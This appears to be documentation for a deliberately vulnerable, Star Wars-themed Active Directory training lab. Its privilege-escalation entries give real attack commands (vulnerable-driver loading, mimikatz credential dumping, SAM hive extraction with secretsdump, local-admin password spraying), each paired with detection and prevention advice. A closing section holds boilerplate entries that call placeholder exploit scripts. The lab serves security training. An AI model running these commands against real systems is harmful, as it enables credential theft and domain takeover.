**What it is:** `SeLoadDriverPrivilege` allows non-admins to load third-party kernel drivers. An attacker can load a signed-but-vulnerable driver (BYOVD) to gain arbitrary kernel write primitives and patch the running OS memory (e.g. elevate their process token to `SYSTEM`).
**Why it works here:** `SeLoadDriverPrivilege` is assigned, and indicator notes are dropped.
**Tools:** `KDU`, `EDRSandblast`, `sc`.
**Steps:**
```cmd
sc.exe create RTCore64 binpath= "C:\Tools\RTCore64.sys" type= kernel
sc.exe start RTCore64
```
**Detection:** Event ID `7045` (Service Creation) with Type `Kernel Driver`; Sysmon Event ID `6` (Driver Loaded).
**Prevention:** Enable Hypervisor-Protected Code Integrity (HVCI) and Driver Blocklist.

---

### PE-110 — Hypervisor / Virtual Firmware PE
**What it is:** Vulnerabilities in virtualization hypervisors (QEMU, VirtualBox, Hyper-V) allow a guest VM user to escape virtualization boundaries and execute code on the host machine.
**Why it works here:** Theoretical escape indicators are dropped for research reference.
**Tools:** Hypervisor escape PoCs.
**Steps:**
```cmd
# Trigger hypervisor specific vulnerabilities (e.g. CVE-2024-38080 or historical QEMU escapes)
# to execute code inside the host system context.
```
**Detection:** VM process crashes on the host; anomalous process behaviors or network traffic originating from the hypervisor process.
**Prevention:** Keep hypervisor software fully patched; disable unused virtual devices (e.g., floppy drives, CD-ROMs); use nested virtualization restrictions.

---

### PE-115 — BYOVD Vulnerable Driver Reference
**What it is:** A collection of commonly abused vulnerable signed drivers (e.g. `RTCore64.sys`, `dbutil_2_3.sys`, `mhyprot2.sys`) that are used in Bring-Your-Own-Vulnerable-Driver attacks to bypass EDR/AV security controls.
**Why it works here:** Reference notes are dropped at `C:\Flags\FLAG-PE-115-VulnDriverList.txt`.
**Tools:** LOLDrivers database.
**Steps:**
```cmd
# Reference the list of known vulnerable driver hashes from LOLDrivers database:
# https://www.loldrivers.io/
```
**Detection:** Sysmon Event ID `6` driver loads matching hashes of known vulnerable drivers.
**Prevention:** Restrict driver loading to signed drivers matching the Microsoft Recommended Driver Blocklist.

---

### PE-123 — LAPS Not Deployed
**What it is:** Local Administrator Password Solution (LAPS) is not used. Consequently, a single uniform password is set for the local Administrator account across all workstations and servers. Compromise of a single host enables immediate lateral movement to all other hosts.
**Why it works here:** No LAPS is deployed, and all VMs use the same local Administrator password.
**Tools:** `netexec`, `evil-winrm`, `impacket-wmiexec`.
**Steps:**
```bash
nxc smb 10.10.0.0/24 -u Administrator -p 'SithLord123!' --local-auth
```
**Detection:** Event ID `4624` Logon Type 3 across multiple systems using the same local Administrator account within a short timeframe.
**Prevention:** Implement Microsoft LAPS to randomize and automatically rotate local Administrator passwords on every system.

---

### PE-126 — Protected Users Group is Empty
**What it is:** The "Protected Users" group is an AD security group that enforces strict security controls (e.g. no NTLM auth cached, 4-hour TGT lifetime, Kerberos-only). If left empty, high-privilege accounts (Domain Admins) are susceptible to credential harvesting from LSASS memory.
**Why it works here:** The Protected Users group is left empty.
**Tools:** `mimikatz`, `secretsdump`.
**Steps:**
```cmd
net group "Protected Users" /domain
mimikatz "sekurlsa::logonpasswords" exit
```
**Detection:** Success of NTLM authentication by Domain Admin accounts; long Kerberos ticket lifetimes.
**Prevention:** Add all high-privilege administration accounts (Domain Admins, Enterprise Admins) to the Protected Users security group.

---

### PE-128 — developer2 GenericWrite on Enterprise Admins
**What it is:** A low-privilege domain user has `GenericWrite` rights over the `Enterprise Admins` group. This allows the user to add themselves or any other user to the group, resulting in complete forest-wide compromise.
**Why it works here:** `developer2` is granted `GenericWrite` on the `Enterprise Admins` group.
**Tools:** `PowerView`, `ActiveDirectory` PowerShell module.
**Steps:**
```powershell
Add-ADGroupMember -Identity "Enterprise Admins" -Members "developer2"
```
**Detection:** Event ID `4728` (A member was added to a security-enabled global group) targeting "Enterprise Admins".
**Prevention:** Maintain strict ACLs on administrative groups. Audit group delegation rights using tools like BloodHound.

---

### CVE-2021-36934 — HiveNightmare / SeriousSAM
**What it is:** Windows sets weak ACLs on the `SAM`, `SECURITY`, and `SYSTEM` registry hive files, allowing local non-admin users to read them. Combined with Volume Shadow Copy (VSS), users can read files from shadow copies to retrieve local account hashes.
**Why it works here:** Permissive read permissions (`BUILTIN\Users:R`) are set on `C:\Windows\System32\config\SAM` on `tatooine`.
**Tools:** `HiveNightmare.exe`, `secretsdump`.
**Steps:**
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
impacket-secretsdump -sam C:\Temp\sam -system C:\Temp\system LOCAL
```
**Detection:** Event ID `4663` targeting the configuration registry hives from non-admin accounts.
**Prevention:** Apply Microsoft patch KB5005033. Correct ACLs: `icacls C:\Windows\System32\config\*.* /inheritance:e`.

---

### CVE-2023-36874 — Windows Error Reporting LPE
**What it is:** Windows Error Reporting (WER) allows a local user to escalate privileges by abusing a directory junction/path traversal vulnerability when WER creates error reports.
**Why it works here:** The WER service (`WerSvc`) is enabled and its `LocalDumps` path is pointed to a world-writable location `C:\Tools\dumps`.
**Tools:** public PoC.
**Steps:**
```cmd
# Abuse the path traversal inside the world-writable dumps directory to write files as SYSTEM.
```
**Detection:** EDR/AV detections for WER exploits; creation of unexpected files by `WerSvc.exe`.
**Prevention:** Apply Microsoft patches from July 2023.

---

### CVE-2024-26230 — Telephony Service LPE / TapiSrv
**What it is:** The Windows Telephony Service (`TapiSrv`) runs as `LocalSystem` and can be coerced to load unsigned DLLs from its search path, leading to local privilege escalation.
**Why it works here:** `TapiSrv` is enabled on `scarif` to expose this attack surface.
**Tools:** DLL planting PoC.
**Steps:**
```cmd
sc.exe start TapiSrv
```
**Detection:** Sysmon Event ID `7` (Image Loaded) loading unsigned DLLs under `TapiSrv` process context.
**Prevention:** Apply Windows updates from April 2024.

---

### CVE-2021-1732 — Win32k Privilege Escalation
**What it is:** A win32k console window handle use-after-free vulnerability that allows a local user to execute arbitrary code with kernel privileges.
**Why it works here:** Tatooine runs an unpatched version of Windows Server 2019/Windows 10.
**Tools:** public exploit binaries.
**Steps:**
```cmd
CVE-2021-1732.exe
```
**Detection:** Event ID `4688` (Process Creation) spawned by exploit; EDR signature detections.
**Prevention:** Apply Microsoft patch from February 2021.

---

### CVE-2024-38080 — Hyper-V LPE
**What it is:** An integer overflow vulnerability in Windows Hyper-V that allows a local attacker to execute code as `SYSTEM`.
**Why it works here:** Unpatched Hyper-V installations (reference notes dropped).
**Tools:** public exploit binaries.
**Steps:**
```cmd
# Execute the exploit binary inside a Hyper-V guest or host VM.
```
**Detection:** EDR alert; unexpected system crashes (BSOD) during exploit attempts.
**Prevention:** Apply July 2024 security updates.

---

### CVE-2025-21333 — Windows Hyper-V NT Kernel LPE
**What it is:** A heap overflow vulnerability in the Hyper-V NT Kernel Integration VSP driver that allows guest-to-host breakout or local privilege escalation.
**Why it works here:** Unpatched systems in the lab.
**Tools:** public escape exploits.
**Steps:**
```cmd
# Run guest escape exploit tool on target.
```
**Detection:** anomalous kernel drivers or process executions outside VM boundaries.
**Prevention:** Apply January 2025 security updates.

---

Next: [`06-persistence.md`](06-persistence.md).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!


## Additional Vulnerabilities
### PE-CVE-2021-1732
**Explanation:** This vulnerability (PE-CVE-2021-1732) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2021-1732.py --target target_ip
```

### PE-CVE-2021-36934
**Explanation:** This vulnerability (PE-CVE-2021-36934) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2021-36934.py --target target_ip
```

### PE-CVE-2023-36874
**Explanation:** This vulnerability (PE-CVE-2023-36874) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2023-36874.py --target target_ip
```

### PE-CVE-2024-26230
**Explanation:** This vulnerability (PE-CVE-2024-26230) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2024-26230.py --target target_ip
```

### PE-CVE-2024-38080
**Explanation:** This vulnerability (PE-CVE-2024-38080) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2024-38080.py --target target_ip
```

### PE-CVE-2025-21333
**Explanation:** This vulnerability (PE-CVE-2025-21333) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_pe-cve-2025-21333.py --target target_ip
```

